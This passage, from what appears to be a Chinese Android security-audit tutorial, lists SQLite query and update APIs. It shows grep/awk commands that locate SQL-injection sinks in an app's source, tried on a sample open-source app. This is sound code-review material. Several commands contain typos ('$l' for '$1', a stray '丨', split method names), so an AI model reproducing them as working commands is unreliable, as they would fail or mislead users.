&lt;span class=&#34;token function&#34;&gt;buildUnionSubQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; typeDiscriminatorColumn&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; unionColumns&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; columnsPresentInTable&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; computedColumnsOffset&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; typeDiscriminatorValue&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; selection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; groupBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; having&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//结合所有当前设置和传递给该方法的信息，这些一个查询&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;SQLiteDatabase&lt;/span&gt; db&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; projectionin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; selection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; groupBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; having&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sortOrder&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; limit&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//android.database.sqlite.SQLiteDatabase&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//在数据库中删除行的简便方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; whereClause&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; whereArgs&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//执行单个SQL语句，该SQL语句既不是SELECT语句，也不是任何其他返回数据的SQL语句 &lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;execSQL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//执行单个SQL语句，该SQL语句不是SELECT/INSERT/UPDATE/DELETE语句&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;execSQL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt; Object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; bindArgs&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//向数据库插入一行数据的便捷方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; nullColumnHack&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Contentvalues&lt;/span&gt; values&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//向数据库插入一行数据的便捷方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;insertOrThrow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; nullColumnHack&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Contentvalues&lt;/span&gt; values&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//向数据库插入一行数据的通用方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;insertWithOnConflict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; nullColumnHack&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Contentvalues&lt;/span&gt; initialvalues&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; conflictAlgorithm&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//查询指定的表，返回结果集上的一个游标(Cursor)&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; columns&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; selection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; groupBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; having&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; orderBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; limit&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//查询指定的URL,返回结果集上的一个游标&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;queryWithFactory&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;SQLiteDatabase&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;CursorFactory&lt;/span&gt; cursorFactory&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;boolean&lt;/span&gt; distinct&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; columns&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;selection&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt; String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; groupBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;having&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt; String&lt;/span&gt; orderBy&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; limit&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;//运行指定的SQL语句，返回结果集上的一个游标&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;rawQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sql&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//运行指定的SQL语句，返回结果集上的一个游标&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;rawQueryWithFactory&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;SQLiteDatabase&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;CursorFactory&lt;/span&gt; cursorFactory&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sql&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; editTable&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//替换数据库中数据行的便捷方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; nullColumnHack&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Contentvalues&lt;/span&gt; initialvalues&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;//替换数据库中数据行的便捷方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;replaceOrThrow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; nullColumnHack&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Contentvalues&lt;/span&gt; initialValues&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//更新数据库中数据行的便捷方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Contentvalues&lt;/span&gt; values&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; whereClause&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; whereArgs&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//更新数据库中数据行的便捷方法&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;updateWithOnConflict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; table&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Contentvalues&lt;/span&gt; values&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; whereClause&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; whereArgs&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; conflictAlgorithm&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;跟踪数据-1&#34;&gt;&lt;a href=&#34;#跟踪数据-1&#34; class=&#34;headerlink&#34; title=&#34;跟踪数据&#34;&gt;&lt;/a&gt;跟踪数据&lt;/h5&gt;&lt;p&gt;通过shell命令在源文件中查找上述类方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithO nConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFacto ry(\|replace(\|replaceOrThrow(\|update(\丨 updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query(&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;{print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;搜索包含动态SQL语句的字符串&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;String.*=.*&lt;span class=&#34;token entity&#34; title=&#34;\&amp;quot;&#34;&gt;\&#34;&lt;/span&gt;\(SELECT\|UPDATE\|INSERT\|DROP\)&#34;&lt;/span&gt; src/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F: &lt;span class=&#34;token string&#34;&gt;&#39;(print &#34;filename: &#34;$l&#34;\nline: &#34;$2&#34;\nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;示例&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ svn checkout http://android-sap-note-viewer.googlecode.com/svn/trunk/sap-note-viewer
$ &lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithOnConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFactory(\|replace(\|replaceOrThrow(\|update(\|updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query(&#34;&lt;/span&gt; sap-note-viewer/ &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;awk&lt;/span&gt; -F:	&lt;span class=&#34;token string&#34;&gt;&#39;{print nfilename: &#34;$l&#34;\nline: &#34;$2&#34;\
nmatch: &#34;$3&#34;\n\n&#34;}&#39;&lt;/span&gt;
filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java
line: &lt;span class=&#34;token number&#34;&gt;106&lt;/span&gt;
match: public Cursor query&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Uri uri, String&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; projection, String selection, String&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; selectionArgs, String sortOrder&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java
line: &lt;span class=&#34;token number&#34;&gt;121&lt;/span&gt;
match: Cursor c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; qBuilder.query&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;db, projection, selection, selectionArgs, null, null, sortOrder&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;源码&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@Override&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Cursor&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Uri&lt;/span&gt; uri&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; projection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; selection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sortOrder&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;SQLiteQueryBuilder&lt;/span&gt; qBuilder &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;SQLiteQueryBuilder&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
qBuilder&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setTables&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;DATABASE_TABLE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//如果搜索为空，就添加一个通配符，在内容之前和之后添加通配符&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;selectionArgs&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;selectionArgs&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token 